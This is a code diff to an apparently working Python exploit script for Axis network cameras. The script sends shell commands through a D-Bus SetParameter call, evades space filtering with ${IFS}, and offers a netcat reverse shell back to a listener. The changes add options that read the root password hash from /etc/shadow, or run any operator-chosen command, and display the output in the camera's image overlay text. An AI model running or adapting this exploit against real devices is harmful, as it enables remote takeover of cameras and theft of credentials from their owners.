@@ -29,11 +29,12 @@ parser.add_argument("-x",   "--test", action="store_true", help="Test for vulner
 parser.add_argument("-T",   "--target", type=str, required=True, help="Target device IP")
 parser.add_argument("-TP",  "--target-port", type=int, help="Target device port", default="80")
 parser.add_argument("-L",   "--listen", type=str, help="Listener IP (if not specified, response from http://checkip.amazonaws.com)")
-parser.add_argument("-LP",  "--listen-port", type=int, help="Listener port", default="1337")
+parser.add_argument("-LP",  "--listen-port", type=int, help="Listener port", default=1337)
 
 # Overlay arguments
-parser.add_argument("-ot",   "--overlay-text", type=str, help="Specify image overlay text")
-parser.add_argument("-ol",   "--overlay-leak", action="store_true", help="Exfiltrate root password hash from shadow with image text overlay")
+parser.add_argument("-ot",  "--overlay-text", type=str, help="Specify image overlay text")
+parser.add_argument("-ol",  "--overlay-leak", action="store_true", help="Read from file and display with image overlay text (default: root password hash)")
+parser.add_argument("-olc", "--overlay-leak-command", type=str, help="Optional leak command (USE AT OWN RISK)")
 
 # Non-overlay command arguments
 parser.add_argument("-r",   "--reverse", action="store_true", help="Request reverse shell from target (nc [LISTEN] [LISTEN_PORT] -e /bin/sh)")
@@ -54,7 +55,9 @@ listen_port = 1337
 overlay_text = None
 req_proxy = ""
 
-# Process arguments
+"""
+    Process arguments
+"""
 if (args.target_port != None):
     target_port = args.target_port
 
@@ -87,6 +90,12 @@ if (args.overlay_text != None and args.overlay_leak):
 if (args.overlay_text != None):
     overlay_text = args.overlay_text
 
+if (args.overlay_leak):
+    leak_cmd = "grep 'root' /etc/shadow | cut '-d:' -f2"
+
+if (args.overlay_leak_command != None):
+    leak_cmd = args.overlay_leak_command
+
 if (args.execute != None):
     exe_cmd = f"{args.execute}"
 else:
@@ -96,12 +105,24 @@ else:
 if (args.execute != None and args.reverse):
     logging(f"Reverse and Execute specified:\n\tOverriding --reverse command with --execute command.\n")
 
-logging(f"Configuration\n-------------\nTarget: {target_proto}://{target_ip}:{target_port}/{target_file}\nListener: {listen_ip}:{listen_port}\nOverlay: {overlay_text}\nProxy: {req_proxy}\n")
+
+"""
+    Output some configuration
+"""
+logging(f"Configuration\n-------------\nTarget: {target_proto}://{target_ip}:{target_port}/{target_file}\nListener: {listen_ip}:{listen_port}\nOverlay: {overlay_text}\n")
+
+if (args.overlay_leak or args.overlay_leak_command != None):
+    logging(f"Overlay Leak: {leak_cmd}\n")
+
+logging(f"Proxy: {req_proxy}\n")
 
 if (args.reverse or args.execute != None):
     logging(f"Command: {exe_cmd}\n")
 logging(f"\n")
 
+"""
+    Quality of life
+"""
 # Character generator
 def gen_chars(count: int) -> str:
     letters = ''.join(random.choice(string.ascii_lowercase) for i in range(count))
@@ -234,8 +255,12 @@ def overlay_leak():
     global stage
     overlay_enable()
     
-    leak_cmd = "$(grep 'root' /etc/shadow | cut '-d:' -f2)"
-    overlay_leak_cmd = f"gdbus call --system --dest com.axis.PolicyKitParhand --object-path /com/axis/PolicyKitParhand --method com.axis.PolicyKitParhand.SetParameter Image.I0.Text.String {leak_cmd}"
+    # if (args.overlay_leak_command):
+    #     leak_cmd = args.overlay_leak_command
+    # else:
+    #     leak_cmd = "grep 'root' /etc/shadow | cut '-d:' -f2"
+
+    overlay_leak_cmd = f"gdbus call --system --dest com.axis.PolicyKitParhand --object-path /com/axis/PolicyKitParhand --method com.axis.PolicyKitParhand.SetParameter Image.I0.Text.String $({leak_cmd})"
     overlay_leak_cmd_ifs = overlay_leak_cmd.replace(' ', "${IFS}")
 
     OVERLAY_DATA = {
@@ -243,7 +268,7 @@ def overlay_leak():
         'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:root.Time.DST.Enabled string:;({overlay_leak_cmd_ifs})&",
     }
 
-    logging(f"Stage {stage}: Modifying image text overlay...\t\t\t")
+    logging(f"Stage {stage}: Modify and leak with image text overlay...\t")
     send_req(OVERLAY_DATA)
     sleep(1)
     sync_req()
@@ -286,7 +311,7 @@ def main():
     if (overlay_text != None):
         overlay_req()
 
-    if (args.overlay_leak):
+    if (args.overlay_leak or args.overlay_leak_command):
         overlay_leak()
 
     if (args.reverse or args.execute != None):
